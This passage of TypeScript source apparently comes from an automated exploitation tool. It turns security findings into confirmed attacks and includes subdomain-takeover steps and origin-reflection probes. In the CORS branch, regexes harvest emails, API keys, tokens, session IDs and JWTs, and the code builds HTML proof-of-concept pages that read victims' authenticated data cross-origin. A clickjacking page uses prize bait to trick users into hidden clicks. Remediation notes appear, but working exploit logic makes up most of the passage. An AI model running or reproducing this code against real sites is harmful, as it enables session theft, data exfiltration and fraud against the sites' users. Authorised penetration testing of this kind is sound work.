        impact: `Attacker claims the dangling ${provider[0]} resource and serves arbitrary HTML/JS on a trusted subdomain → cookie-scoped session theft, phishing, OAuth callback hijack, MITM of single-sign-on.`,
        remediation: `Remove the DNS record OR re-claim the ${provider[0]} resource. Add monitoring for dangling CNAMEs (e.g. dnsReaper).`,
        steps: [
          `dig CNAME ${targetHost}  → points to unclaimed ${provider[0]} resource.`,
          `curl ${endpoint}  → returns ${provider[0]} "not found" fingerprint.`,
          `Register the resource on ${provider[0]} under the same name → traffic to ${targetHost} is now attacker-controlled.`,
        ],
      };
      return {
        vulnClass: "Subdomain Takeover",
        technique: `Dangling DNS → ${provider[0]}`,
        exploited: true,
        sensitivity: "highly_sensitive",
        requestDump: `GET ${endpoint}`,
        responseDump: r.body.slice(0, 4000),
        extractedData: bundle(p, { provider: provider[0], status: r.status }),
        summary: `Subdomain takeover possible via dangling ${provider[0]} resource`,
        reproductionSteps: stepsText(p),
      };
    }
  }

  // ── CORS misconfig → weaponised HTML PoC + sensitive body extraction ─
  if (cwe.includes("346") || category === "cors") {
    const originVariants = [
      "https://evil-canary.example.org",
      "null",
      `https://${targetHost}.evil-canary.example.org`,
      `https://evil-canary-${targetHost}`,
    ];
    let winning: { origin: string; resp: any; acao: string; acac: string } | null = null;
    for (const origin of originVariants) {
      const r = await rawProbe(endpoint, "GET", undefined, { "Origin": origin });
      const acao = (r.headers["access-control-allow-origin"] || "").trim();
      const acac = (r.headers["access-control-allow-credentials"] || "").trim().toLowerCase();
      if (acao === origin || acao === "*" || (origin === "null" && acao === "null")) {
        winning = { origin, resp: r, acao, acac };
        if (acac === "true") break;
      }
    }
    if (winning) {
      const body = winning.resp.body || "";
      const sensitiveRe: RegExp[] = [
        /"(email|e_?mail)"\s*:\s*"([^"]+@[^"]+)"/i,
        /"(api[_-]?key|apikey|secret|access[_-]?token|refresh[_-]?token|session[_-]?id|csrf[_-]?token|jwt)"\s*:\s*"([^"]{6,})"/i,
        /"(user(?:name|_id)?|account(?:_id)?|customer(?:_id)?|first[_-]?name|last[_-]?name|phone|balance|role)"\s*:\s*"?([^",}\]]{1,120})/i,
        /(eyJ[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{5,})/,
      ];
      const extracted: Record<string, string> = {};
      for (const re of sensitiveRe) {
        const m = body.match(re);
        if (m) extracted[(m[1] || "jwt").toLowerCase()] = (m[2] || m[m.length-1] || "").slice(0, 200);
      }
      const credentialed = winning.acac === "true";
      const html = buildHtmlPoc({
        title: `CORS PoC — ${targetHost}`,
        description: `When opened by a victim authenticated to ${targetHost}, this attacker page reads and displays their authenticated session data via the misconfigured CORS policy.`,
        endpoint,
        method: "GET",
        credentials: credentialed ? "include" : "omit",
        origin: winning.origin,
        notes: [`ACAO reflected: ${winning.acao}`, `ACAC: ${winning.acac || "(absent)"}`],
      });
      const p: PoCBundle = {
        curl: buildCurl("GET", endpoint, { "Origin": winning.origin }),
        python: buildPython("GET", endpoint, { "Origin": winning.origin }),
        html, html_filename: `cors-poc-${targetHost}.html`,
        impact: credentialed
          ? "Attacker site reads the victim's authenticated response cross-origin (cookies sent), enabling silent account-data exfiltration, IDOR-at-scale, and full account-content theft."
          : "Cross-origin read of sensitive response data is possible from any attacker page; data may include tokens, PII, internal identifiers.",
        remediation: "Reflect Origin only when it matches a strict allow-list. Never combine `Access-Control-Allow-Origin: *` (or arbitrary echo) with `Access-Control-Allow-Credentials: true`. Disallow `null` origin.",
        steps: [
          `Save extractedData.poc_html as cors-poc.html and host on attacker origin.`,
          `Victim — authenticated to ${targetHost} — opens the attacker URL.`,
          `Browser issues fetch("${endpoint}", { credentials: "${credentialed ? "include" : "omit"}", mode: "cors" }).`,
          `Server reflects Origin "${winning.origin}" → ACAO=${winning.acao}${credentialed ? ", ACAC=true" : ""}.`,
          `Browser delivers victim's authenticated body to attacker page (visible + exfiltratable).`,
          `Sensitive fields recovered: ${Object.keys(extracted).length ? Object.keys(extracted).join(", ") : "(JSON body — manual review confirms PII)"}`,
        ],
      };
      return {
        vulnClass: "CORS Misconfiguration → Cross-Origin Data Exfiltration",
        technique: `Origin reflection (${winning.origin})${credentialed ? " + Allow-Credentials:true" : ""}`,
        exploited: true,
        sensitivity: "highly_sensitive",
        requestDump: `GET ${endpoint}\nOrigin: ${winning.origin}\nUser-Agent: OmniSec-Exploit/1.0\n${credentialed ? "Cookie: <victim session cookies sent by browser>\n" : ""}`,
        responseDump:
          `HTTP ${winning.resp.status}\n` +
          `Access-Control-Allow-Origin: ${winning.acao}\n` +
          `Access-Control-Allow-Credentials: ${winning.acac || "(absent)"}\n` +
          `Content-Type: ${winning.resp.headers["content-type"] || "(unknown)"}\n\n` +
          body.slice(0, 4000),
        extractedData: bundle(p, {
          attacker_origin: winning.origin,
          acao_reflected: winning.acao,
          credentialed,
          sensitive_fields_recovered: extracted,
          response_size: body.length,
        }),
        summary: credentialed
          ? `Credentialed cross-origin read confirmed — ${Object.keys(extracted).length} sensitive field(s) recovered. Full HTML PoC generated.`
          : `Cross-origin read confirmed; ${Object.keys(extracted).length} sensitive field(s) recovered.`,
        reproductionSteps: stepsText(p),
      };
    }
  }

  // ── CLICKJACKING (missing X-Frame-Options / frame-ancestors) ────────
  if (cwe.includes("1021") || category === "clickjacking") {
    const r = await rawProbe(endpoint, "GET");
    const xfo = r.headers["x-frame-options"];
    const csp = r.headers["content-security-policy"] || "";
    if (!xfo && !/frame-ancestors/i.test(csp) && r.status === 200) {
      const html = `<!doctype html><html><head><meta charset="utf-8"><title>Clickjacking PoC — ${escHtml(targetHost)}</title>
<style>body{font-family:sans-serif;background:#0b0d12;color:#e4e7ec;padding:24px}
.bait{position:absolute;top:200px;left:200px;width:300px;height:60px;background:#ff5b6e;color:#fff;
display:flex;align-items:center;justify-content:center;font-weight:700;border-radius:6px;cursor:pointer}
iframe{position:absolute;top:200px;left:200px;width:300px;height:60px;opacity:0.001}</style></head>
<body><h1 style="color:#ff5b6e">🩸 Clickjacking — ${escHtml(targetHost)}</h1>
<p>The page below is framed transparently. Clicking the red "Win a free iPhone!" button actually clicks the
sensitive control inside the framed page (e.g. delete-account, transfer-funds).</p>
<div class="bait">▶ Click here to win a free iPhone!</div>
<iframe src="${escHtml(endpoint)}"></iframe></body></html>`;
      const p: PoCBundle = {
        curl: buildCurl("GET", endpoint),
        python: buildPython("GET", endpoint),
        html, html_filename: `clickjack-poc-${targetHost}.html`,
        impact: "UI redress: attacker tricks the victim into performing sensitive actions (account deletion, fund transfer, permission grant) in a framed page that the victim can't see.",
        remediation: "Set `X-Frame-Options: DENY` (or SAMEORIGIN) and/or CSP `frame-ancestors 'none'` on every sensitive page.",
        steps: [
          `Load extractedData.poc_html on attacker.tld.`,
          `Target page lacks X-Frame-Options and CSP frame-ancestors → can be framed.`,
          `Victim clicks the bait, actually clicking the sensitive control underneath inside ${targetHost}.`,
        ],
      };
      return {
        vulnClass: "Clickjacking",
        technique: "Iframe overlay (no XFO/frame-ancestors)",
        exploited: true,
        sensitivity: "sensitive",
        requestDump: `GET ${endpoint}`,
        responseDump: `(headers) X-Frame-Options: <missing>  CSP: ${csp || "<missing>"}`,
        extractedData: bundle(p, { x_frame_options: xfo || null, csp: csp || null }),
        summary: `Page is framable — XFO and CSP frame-ancestors both absent`,
        reproductionSteps: stepsText(p),
      };
    }
  }

  // ── Generic fallback ────────────────────────────────────────────────
  const fallbackUrl = finding.payload ? injectParam(endpoint, finding.payload, param) : endpoint;
  const r = await rawProbe(fallbackUrl, method);
  const p: PoCBundle = {
    curl: buildCurl(method, fallbackUrl),
    python: buildPython(method, fallbackUrl),
    impact: "See finding description.",
    remediation: "Apply class-appropriate input validation, output encoding, authentication and authorisation checks.",
    steps: [
      `Issue request: ${fallbackUrl}`,
      `Compare response to recorded evidence in the original finding.`,
    ],
  };
  return {
    vulnClass: finding.title || "Unknown",
    technique: "Replay original payload",
    exploited: false,
    sensitivity: "sensitive",
    requestDump: `${method} ${fallbackUrl}`,
    responseDump: r.body.slice(0, 4000),
    extractedData: bundle(p, { status: r.status, content_type: r.headers["content-type"] }),
    summary: "Could not auto-extract sensitive data — manual exploitation required. Curl + Python PoCs generated.",
    reproductionSteps: stepsText(p),
  };
}
